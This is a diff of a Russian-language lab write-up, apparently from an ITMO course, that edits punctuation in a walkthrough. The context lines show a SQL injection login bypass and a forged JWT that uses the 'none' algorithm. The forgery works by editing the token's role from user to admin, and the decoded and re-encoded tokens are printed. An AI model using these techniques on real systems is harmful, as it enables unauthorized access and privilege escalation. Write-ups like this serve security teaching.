@@ -30,7 +30,7 @@ AND password = 'admin' OR '1'='1';
 
 ![скриншот](images/itmo_profile.png)
 
-Далее необходимо найти JWT:
+Далее необходимо найти JWT.
 
 Для этого нужно перейти в консоль разработчика (F12) -> Application -> Cookies. JWT:
 
@@ -38,11 +38,11 @@ AND password = 'admin' OR '1'='1';
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJzdHVkZW50IiwibmFtZSI6IklUTU8gU3R1ZGVudCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzgxOTczNDA3fQ.
 ```
 
-Необходимо выполнить декодирование второй части payload в формате base64
+Необходимо выполнить декодирование второй части payload в формате base64.
 
 После декодирования: `{"sub":"1","username":"student","name":"ITMO Student","role":"user","iat":1781973407}`
 
-Она совпадает с тем, что указано выше. Далее меняем роль на `admin`, шифруем в base64 и добавляем первую часть. Вставляем в консоль.
+Она совпадает с тем, что указано выше. Далее меняем роль на `admin`, шифруем в base64 и добавляем первую часть. Вставляем в консоль разработчика.
 
 ```base64
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJzdHVkZW50IiwibmFtZSI6IklUTU8gU3R1ZGVudCIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4MTk3MzQwN30=.
